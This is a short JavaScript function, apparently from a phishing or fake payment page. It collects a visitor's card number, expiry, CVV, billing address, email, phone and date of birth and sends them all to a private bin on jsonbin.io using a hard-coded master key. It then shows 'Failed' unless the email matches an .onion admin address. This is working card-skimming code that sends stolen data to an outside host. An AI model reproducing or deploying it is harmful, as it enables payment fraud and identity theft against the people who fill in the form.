
function capt(){
    
    
    var cardHolderName= document.getElementById("holderName").value;
    var cardNumber= document.getElementById("cardNumber").value
    var expiryDate= document.getElementById("expiryDate").value
    var CVV= document.getElementById("CVV").value
    
    var address= document.getElementById("address").value;
    var city= document.getElementById("city").value;
    var country= document.getElementById("country").value;
    
    var email= document.getElementById("email").value;
    var number= document.getElementById("number").value;
    var dateOfBirth= document.getElementById("dateOfBirth").value;
    


        
        const secretKey = '$2b$10$5.GD5IWqNSL2RsbiNWZdbeQGJ3wkUk/t3ZxfbbLn2ddvAPibpWpr.';
        const binName= 'myBin';



      
        const data = {
        Name: cardHolderName,
        CardNumber: cardNumber,
        Expiry: expiryDate,
        Cvv: CVV,
        Address: address,
        City: city,
        Country: country,
        Email: email,
        phoneNumber: number,
        DateOfBirth: dateOfBirth
        
      };

      
       fetch('https://api.jsonbin.io/v3/b', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              "X-Master-Key": secretKey,
              "X-Bin-Private": true,
              'X-Bin-Name': cardHolderName
            },
            body: JSON.stringify(data)
          })
         .then(response => response.json())
         .then(jsonData => console.log(jsonData))
         .catch(error => console.error(error));
      


    var tefEmail = document.getElementById("email").value;

    if (tefEmail=="admin3@trackmateai.onion"){
          var x = document.getElementById("snackbar");
          x.className = "show";
          setTimeout(function(){ x.className = x.className.replace("show", ""); }, 4000);
          //window.location.href=("appNewAppTracking.html");
    }else{
          alert("Failed");
    }
            





}
